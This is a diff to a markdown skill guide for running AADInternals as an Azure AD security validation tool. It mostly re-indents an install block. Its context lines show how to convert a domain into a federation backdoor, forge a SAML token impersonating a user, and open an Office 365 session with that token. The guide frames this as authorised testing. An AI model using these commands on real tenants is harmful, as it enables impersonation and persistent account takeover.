@@ -46,12 +46,12 @@ This skill drives AADInternals through a defensive-validation lens: confirm what
 - Windows host with PowerShell 5.1+ (or PowerShell 7 on the supported subset)
 - For backdoor/federation tests: Global Administrator (or equivalent) in the target tenant, in scope per the ROE
 - Install the module from the PowerShell Gallery:
-  ```powershell
-  Install-Module AADInternals -Scope CurrentUser
-  Import-Module AADInternals
-  # Cross-platform AsOutsider-only reimplementation (no creds) is also available:
-  #   https://github.com/synacktiv/AADOutsider-py
-  ```
+ ```powershell
+ Install-Module AADInternals -Scope CurrentUser
+ Import-Module AADInternals
+ # Cross-platform AsOutsider-only reimplementation (no creds) is also available:
+ # https://github.com/synacktiv/AADOutsider-py
+ ```
 - Familiarity with SAML/WS-Federation, OAuth tokens, and Azure AD Connect
 
 ## Objectives
@@ -141,7 +141,7 @@ ConvertTo-AADIntBackdoor -DomainName "backdoor.target.com"
 
 # Forge a SAML token impersonating a user (ImmutableId from Get-AADIntUsers)
 $saml = New-AADIntSAMLToken -ImmutableID "UQ989+t6fEq9/0ogYtt1pA==" `
-    -Issuer "http://backdoor.target.com/adfs/services/trust/" -UseBuiltInCertificate
+ -Issuer "http://backdoor.target.com/adfs/services/trust/" -UseBuiltInCertificate
 
 # Use the forged token to open a portal session as the impersonated user
 Open-AADIntOffice365Portal -SAMLToken $saml
